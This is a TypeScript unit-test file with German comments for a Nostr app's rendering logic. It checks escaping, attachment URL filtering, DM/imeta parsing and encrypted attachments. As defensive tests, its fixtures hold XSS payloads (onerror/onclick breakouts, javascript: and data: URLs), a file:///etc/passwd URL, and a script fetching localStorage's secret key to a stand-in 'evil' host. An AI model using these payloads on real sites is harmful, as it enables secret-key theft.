/**
 * Tests fuer die Darstellungslogik der App.
 *
 * Der Schwerpunkt liegt auf feindlichen Eingaben: alles hier verarbeitet Text
 * aus fremden Relay-Events. Genau an dieser Stelle steckte schon einmal ein
 * XSS-Loch (interpoliertes onclick in den LP-Angeboten), ueber das der
 * Nostr-Secret-Key aus localStorage abfliessen konnte.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  escapeHtml,
  pkShort,
  isSafeAttachmentUrl,
  anhangAnsicht,
  isForeignPaymentNoise,
  fmtSats,
  fmtSol,
  budgetView,
  ago,
  parseDmBody,
  parseImetaTags,
  imetaSchluessel,
} from "../src/shell-logic.js";
import { verschluesseleDatei } from "@freedomstack/protocol";
import { setLang } from "../src/i18n.js";

// Meldungen und Zahlen hier auf Deutsch prüfen (seit 8.16g1 in der Sprache der Oberfläche)
setLang("de");

// ------------------------------------------------------------- Escaping

test("Escaping: die klassischen Ausbruchszeichen sind weg", () => {
  const boese = `<img src=x onerror="alert(1)">`;
  const sicher = escapeHtml(boese);
  for (const c of ["<", ">", '"', "'"]) {
    assert.ok(!sicher.includes(c), `${c} darf nicht durchkommen`);
  }
});

test("Escaping: Anfuehrungszeichen, damit Attribute nicht ausbrechbar sind", () => {
  // Ohne Quote-Escaping waere data-name="<hier>" der Einstieg.
  const raus = escapeHtml(`" onmouseover="alert(1)`);
  assert.ok(!raus.includes('"'));
  assert.ok(!raus.includes("'"));
});

test("Escaping: kaufmaennisches Und wird zuerst behandelt", () => {
  // Sonst wuerde "&lt;" zu "&amp;lt;" oder umgekehrt doppelt dekodierbar.
  assert.equal(escapeHtml("&"), "&#38;");
  assert.equal(escapeHtml("&lt;"), "&#38;lt;");
});

test("Escaping: harmloser Text bleibt lesbar", () => {
  assert.equal(escapeHtml("Grüße aus Wien — alles ok"), "Grüße aus Wien — alles ok");
  assert.equal(escapeHtml(""), "");
});

test("Pubkey-Kurzform: kuerzt, ohne die Enden zu verlieren", () => {
  const pk = "a".repeat(32) + "b".repeat(32);
  const kurz = pkShort(pk);
  assert.ok(kurz.startsWith("aaaaaaaa"));
  assert.ok(kurz.endsWith("bbbb"));
  assert.ok(kurz.length < 20);
  // Kurze Eingaben nicht verstuemmeln.
  assert.equal(pkShort("abc"), "abc");
});

// ------------------------------------------------------------- URL-Schemata

test("Anhang-URLs: gefaehrliche Schemata werden abgelehnt", () => {
  for (const url of [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox",
    "blob:https://evil.io/x",
    "file:///etc/passwd",
    "",
  ]) {
    assert.equal(isSafeAttachmentUrl(url), false, `${url} muss abgelehnt werden`);
  }
});

test("Anhang-URLs: Steuerzeichen-Trick greift nicht", () => {
  // Manche Parser lesen "java\nscript:" noch als javascript:.
  assert.equal(isSafeAttachmentUrl("java\nscript:alert(1)"), false);
  assert.equal(isSafeAttachmentUrl("\u0001javascript:alert(1)"), false);
  assert.equal(isSafeAttachmentUrl("  javascript:alert(1)"), false);
});

test("Anhang-URLs: erlaubte Schemata funktionieren weiter", () => {
  for (const url of [
    "https://cdn.example.com/bild.png",
    "http://192.0.2.1/video.mp4",
    "data:image/png;base64,iVBOR",
    "data:audio/mpeg;base64,SUQz",
  ]) {
    assert.equal(isSafeAttachmentUrl(url), true, url);
  }
});

// ------------------------------------------------------------- Anhänge

// Seit C-6c beschreibt anhangAnsicht() den Anhang, statt HTML zu bauen: Name, Typ und
// Adresse bleiben Daten, die Oberfläche setzt sie nur als Eigenschaft, dataset oder Text
// (dom-statt-html.test.ts, Smoke „fremdtext“). Geprüft wird hier, was erscheint.

test("Anhang: boesartiger Dateiname bleibt ein Name – das Bild nur mit geprüfter Adresse", () => {
  const name = `<script>fetch('http://evil/?k='+localStorage['freedom.sk'])</script>`;
  assert.deepEqual(anhangAnsicht({ name, mime: "image/png", size: 1, url: "https://ok.example/a.png" }),
    { art: "bild", url: "https://ok.example/a.png", name }, "genau dieser Weg war der alte XSS-Pfad – jetzt nur noch alt-Text");
});

test("Anhang: boesartige URL wird nicht als Quelle gesetzt", () => {
  const v = anhangAnsicht({ name: "bild", mime: "image/png", size: 1, url: "javascript:alert(1)" });
  assert.equal(v.art, "hinweis");
  assert.ok(!JSON.stringify(v).includes("javascript:"));
  assert.match((v as { text: string }).text, /nicht unterstützt/);
});

test("Anhang: boesartiger Name in der Meldung ueber einen abgelehnten Link bleibt Text (8.16g1)", () => {
  const v = anhangAnsicht({ name: "<img src=x onerror=alert(1)>", mime: "image/png", size: 1, url: "javascript:alert(1)" });
  assert.deepEqual(v, { art: "hinweis", text: "[Anhang mit nicht unterstütztem Link: <img src=x onerror=alert(1)>]" });
});

test("Anhang: Anfuehrungszeichen in der URL bleiben Teil der Adresse", () => {
  const url = `https://ok.io/a.png" onerror="alert(1)`;
  // Als Eigenschaft (img.src) gibt es kein Attribut, aus dem sie ausbrechen könnten
  assert.deepEqual(anhangAnsicht({ name: "x", mime: "image/png", size: 1, url }), { art: "bild", url, name: "x" });
});

test("Anhang: Medientypen werden passend dargestellt", () => {
  const art = (mime: string, url: string) => anhangAnsicht({ name: "a", mime, size: 1, url }).art;
  assert.equal(art("image/png", "https://x.io/a.png"), "bild");
  assert.equal(art("VIDEO/MP4", "https://x.io/a.mp4"), "video", "Grossschreibung im MIME-Typ darf nichts kaputtmachen");
  assert.equal(art("audio/ogg", "https://x.io/a.ogg"), "audio");
  assert.deepEqual(anhangAnsicht({ name: "a", mime: "application/pdf", size: 1, url: "https://x.io/a.pdf" }),
    { art: "link", url: "https://x.io/a.pdf", text: "📎 a" }, "fremde Links bekommen kein window.opener – rel setzt die Oberfläche");
});

test("Anhang: Blob-Verweis wird zum Ladeknopf, die ID bleibt Daten", () => {
  const v = anhangAnsicht({ name: "gross.zip", mime: "application/zip", size: 1, url: `freedom-blob:abc" onclick="alert(1)` });
  assert.deepEqual(v, { art: "knopf", text: "📥 gross.zip", daten: { blob: `abc" onclick="alert(1)`, name: "gross.zip" } });
});

test("Anhang: leerer Name bekommt eine Beschriftung", () => {
  assert.deepEqual(anhangAnsicht({ name: "", mime: "x/y", size: 0, url: "https://x.io/a" }), { art: "link", url: "https://x.io/a", text: "📎 datei" });
});

// ------------------------------------------------------------- Formate

test("Betraege: unter 1 sat wird nicht auf null gerundet", () => {
  // Sonst sieht bezahlte Arbeit gratis aus.
  assert.equal(fmtSats(6), "6 msat");
  assert.equal(fmtSats(999), "999 msat");
  assert.equal(fmtSats(0), "0 sats");
});

test("Betraege: groessere Werte lesbar", () => {
  assert.match(fmtSats(1500), /1\.5 sats/);
  assert.match(fmtSats(50_000), /50 sats/);
  assert.match(fmtSats(1_500_000), /1\.500 sats/);
  assert.equal(fmtSats(-5), "—");
  assert.equal(fmtSats(NaN), "—");
});

test("SOL: kleine Betraege bleiben in lamports statt 0,0000 SOL", () => {
  assert.match(fmtSol(5000), /lamports/);
  assert.match(fmtSol(1_000_000_000), /1\.0000 SOL/);
  assert.equal(fmtSol(-1), "—");
});

test("Zeitangabe: Stufen sind sinnvoll", () => {
  const now = 1_800_000_000;
  assert.match(ago(now - 5, now), /gerade eben/);
  assert.match(ago(now - 300, now), /vor 5 min/);
  assert.match(ago(now - 7200, now), /vor 2 h/);
  assert.match(ago(now - 3 * 86400, now), /vor 3 d/);
  // Uhren laufen auseinander — eine Zukunftsangabe darf nicht "vor -2 min" ergeben.
  assert.match(ago(now + 120, now), /gerade eben/);
});

// ------------------------------------------------------------- Budget

test("Budget: warnt frueh genug, um Abbrueche mitten in einer Antwort zu vermeiden", () => {
  assert.equal(budgetView(0, 100_000).level, "ok");
  assert.equal(budgetView(70_000, 100_000).level, "warn");
  assert.equal(budgetView(90_000, 100_000).level, "err");
});

test("Budget: aufgebraucht wird als solches benannt", () => {
  const v = budgetView(100_000, 100_000);
  assert.equal(v.ratio, 1);
  assert.match(v.text, /aufgebraucht/);
});

test("Budget: Ueberzahlung kippt den Balken nicht", () => {
  const v = budgetView(500_000, 100_000);
  assert.ok(v.ratio <= 1, "der Fortschritt darf nicht ueber 100% laufen");
});

test("Budget: ohne Session eine verstaendliche Ansage statt '—'", () => {
  assert.match(budgetView(0, 0).text, /erste Anfrage startet/);
});

// ------------------------------------------------------------- Nachrichten

test("Fremdes Zahlungsrauschen wird als solches erkannt", () => {
  // Der Job des Kunden lief sauber; ein Wallet-Problem beim Provider ist
  // nicht sein Fehler und darf ihn nicht verunsichern.
  assert.equal(isForeignPaymentNoise("NWC timed out after 30s"), true);
  assert.equal(isForeignPaymentNoise("keysend failed: no route"), true);
  assert.equal(isForeignPaymentNoise("Payment Error: insufficient"), true);
  assert.equal(isForeignPaymentNoise("Modell nicht gefunden"), false);
});

test("DM-Body: alte Klartextnachrichten bleiben lesbar", () => {
  const r = parseDmBody("hallo, wie geht es dir?");
  assert.equal(r.text, "hallo, wie geht es dir?");
  assert.equal(r.attachments.length, 0);
});

test("DM-Body: Anhaenge aus dem verschluesselten Teil werden gelesen", () => {
  const r = parseDmBody(JSON.stringify({
    text: "hier das Bild",
    attachments: [{ url: "https://x.io/a.png", mime: "image/png", name: "a", size: 1 }],
  }));
  assert.equal(r.text, "hier das Bild");
  assert.equal(r.attachments.length, 1);
});

test("DM-Body: kaputtes JSON wird als Text behandelt, nicht verschluckt", () => {
  const kaputt = '{"text": "unvollstaendig';
  assert.equal(parseDmBody(kaputt).text, kaputt);
});

test("DM-Body: Anhaenge ohne URL werden aussortiert", () => {
  const r = parseDmBody(JSON.stringify({
    text: "x", attachments: [{ url: "", mime: "image/png", name: "a", size: 1 }, null],
  }));
  assert.equal(r.attachments.length, 0);
});

test("imeta: Community-Anhaenge werden gelesen", () => {
  const atts = parseImetaTags([
    ["imeta", "url https://x.io/a.png", "m image/png", "name bild.png"],
    ["p", "abc"],
    ["imeta", "m image/png"], // ohne url -> raus
  ]);
  assert.equal(atts.length, 1);
  assert.equal(atts[0].url, "https://x.io/a.png");
  assert.equal(atts[0].name, "bild.png");
});

test("imeta: fehlerhafte Tags bringen die Anzeige nicht zum Absturz", () => {
  assert.doesNotThrow(() => parseImetaTags([["imeta"], [], ["imeta", "", ""]]));
  assert.equal(parseImetaTags([["imeta"]]).length, 0);
});

// ------------------------------------------------- Verschluesselte Anhaenge (2.4)

const ENC = verschluesseleDatei(new Uint8Array([1, 2, 3])).schluessel;

test("2.4: verschluesselter Anhang wird ein Knopf mit geprueftem Schluessel, nie eine Quelle", () => {
  const blob = anhangAnsicht({ name: "befund.pdf", mime: "application/pdf", size: 9, url: "freedom-blob:abc123", enc: ENC });
  assert.deepEqual(blob, {
    art: "knopf", text: "🔒 befund.pdf",
    daten: { blob: "abc123", key: ENC.key, nonce: ENC.nonce, ox: ENC.ox, mime: "application/pdf", name: "befund.pdf" },
  });
  const blossom = anhangAnsicht({ name: "bild", mime: "image/png", size: 9, url: "https://blossom.example/ab", enc: ENC });
  assert.equal(blossom.art, "knopf", "Chiffrat nie als Bild einbinden");
  assert.equal((blossom as { daten: Record<string, string> }).daten.url, "https://blossom.example/ab");
});

test("2.4: kaputter Schluessel, fremdes Schema, boesartiger Typ und Name", () => {
  const kaputt = anhangAnsicht({ name: "x", mime: "image/png", size: 1, url: "freedom-blob:a", enc: { ...ENC, key: `${ENC.key.slice(2)}"><script>` } });
  assert.deepEqual(kaputt, { art: "hinweis", text: "[Anhang mit ungültigem Schlüssel: x]" });
  assert.match((anhangAnsicht({ name: "x", mime: "", size: 1, url: "javascript:alert(1)", enc: ENC }) as { text: string }).text, /nicht unterstützt/);
  assert.match((anhangAnsicht({ name: "x", mime: "", size: 1, url: "http://klartext.example/a", enc: ENC }) as { text: string }).text, /nicht unterstützt/, "nur https");
  const name = `"><img src=x onerror=alert(1)>`;
  const boese = anhangAnsicht({ name, mime: `x" onclick="alert(1)`, size: 1, url: "freedom-blob:a", enc: ENC });
  // Bleibt Daten: als dataset gesetzt, gibt es kein neues Tag und kein ausbrechendes Attribut
  assert.deepEqual(boese, { art: "knopf", text: `🔒 ${name}`, daten: { blob: "a", key: ENC.key, nonce: ENC.nonce, ox: ENC.ox, mime: `x" onclick="alert(1)`, name } });
});

test("2.4: Schluessel im imeta-Tag hin und zurueck, ohne Schluessel wie bisher", () => {
  const tag = ["imeta", "url freedom-blob:abc", "m application/pdf", "name a.pdf", ...imetaSchluessel({ name: "a.pdf", mime: "application/pdf", size: 1, url: "freedom-blob:abc", enc: ENC })];
  const [a] = parseImetaTags([tag]);
  assert.deepEqual(a.enc, ENC);
  assert.deepEqual(imetaSchluessel({ name: "a", mime: "", size: 1, url: "https://x" }), []);
  const [b] = parseImetaTags([["imeta", "url https://x.io/a.png", "m image/png"]]);
  assert.equal(b.enc, undefined);
  // Unbekanntes Verfahren: kein Schluessel, also wie ein offener Anhang
  const [c] = parseImetaTags([["imeta", "url https://x.io/a", "encryption-algorithm chacha", `decryption-key ${ENC.key}`]]);
  assert.equal(c.enc, undefined);
});

test("2.4: DM-Body traegt den Schluessel mit", () => {
  const r = parseDmBody(JSON.stringify({ text: "", attachments: [{ url: "freedom-blob:abc", mime: "application/pdf", name: "a", size: 1, enc: ENC }] }));
  assert.deepEqual(r.attachments[0].enc, ENC);
});
